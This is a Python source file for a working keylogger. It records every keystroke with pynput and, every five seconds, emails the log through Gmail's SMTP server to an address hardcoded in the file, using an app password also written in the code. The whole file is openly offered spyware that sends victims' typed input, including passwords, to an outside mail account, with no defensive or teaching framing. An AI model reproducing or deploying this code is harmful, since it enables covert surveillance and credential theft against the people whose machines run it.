#!bin/env pytohon3

import pynput.keyboard 
import threading
import smtplib
from email.mime.text import MIMEText
import subprocess

class keylogger:
    def __init__(self) -> None:
        self.log = ""   
        self.rquests_shutdown = False
        self.timer = None
        self.is_first_run= True
    def pressed_key(self, key):
        try:
            self.log+= str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace  ", key.enter:"\n"}
            self.log +=special_keys.get(key, f" {key} ")
        print(self.log)
        
    def reporte(self):
        Email_body =  "[+]Key log prendido " if self.is_first_run else self.log
        self.send_email("Keylogg report", Email_body, "attritusdotcom@gmail.com", ["attritusdotcom@gmail.com"], "cwum lapx sbmf dzhv")
        self.log = ""
        if self.is_first_run:
            self.is_first_run = False;
        
        if not self.rquests_shutdown:
            self.timer = threading.Timer(5, self.reporte)
            self.timer.start()
        
    def send_email(self, subjet, body:str, sender:str, recipients: list[str], password):
        msg = MIMEText(body)
        msg["Subject"] = subjet
        msg["From"] = sender
        msg["To"] = ','.join(recipients)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smpt_server:
            smpt_server.login(sender, password)
            smpt_server.sendmail(sender, recipients, msg.as_string())

    def start(self):
        keyboar_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboar_listener:
            self.reporte()
            keyboar_listener.join()
    def shutdown(self):
        self.rquests_shutdown = True
        if self.timer:
            self.timer.cancel()




